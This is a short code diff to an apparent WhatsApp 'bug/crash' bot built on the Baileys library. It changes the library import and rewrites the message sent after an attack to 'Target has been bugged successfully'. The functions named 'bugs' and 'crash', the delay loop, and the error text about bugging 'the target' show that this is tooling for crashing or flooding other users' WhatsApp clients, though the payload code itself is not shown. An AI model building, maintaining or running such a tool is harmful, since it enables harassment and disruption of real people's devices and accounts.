@@ -1,6 +1,4 @@
-const pkg = require('baileys');
-const { proto, generateWAMessageFromContent } = pkg;
-const channelSender = require('./channelSender');
+const { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
 
 async function bugs(message, client, participant) {
   const remoteJid = participant;
@@ -75,7 +73,7 @@ async function crash(message, client) {
       await new Promise(resolve => setTimeout(resolve, 1000));
     }
 
-    await channelSender(message, client, 'Target has been bug successfully', 1);
+    await client.sendMessage(remoteJid, { text: '✅ Target has been bugged successfully' });
   } catch (error) {
     console.error('An error occurred while trying to bug the target:', error);
     try {
